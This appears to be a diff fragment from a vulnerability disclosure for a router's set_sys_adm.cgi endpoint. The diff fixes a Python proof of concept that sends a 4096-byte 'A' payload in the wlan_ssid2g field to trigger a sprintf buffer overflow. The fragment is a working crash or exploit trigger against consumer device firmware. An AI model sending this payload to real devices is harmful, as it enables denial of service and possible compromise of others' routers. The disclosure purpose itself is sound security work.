@@ -26,5 +26,5 @@ get value from wlan_ssid2g ,and call sprintf, cause buff overflow
 url = "http://192.168.0.1/cgi-bin/set_sys_adm.cgi"
 payload = 'A'*0x1000 + '\n'
 
-r = requests.post(url, data={ 'page=wzdap&wlan_ssid2g=' + payload})
+r = requests.post(url, data={ 'page':'wzdap', 'wlan_ssid2g': payload})
 ``` 
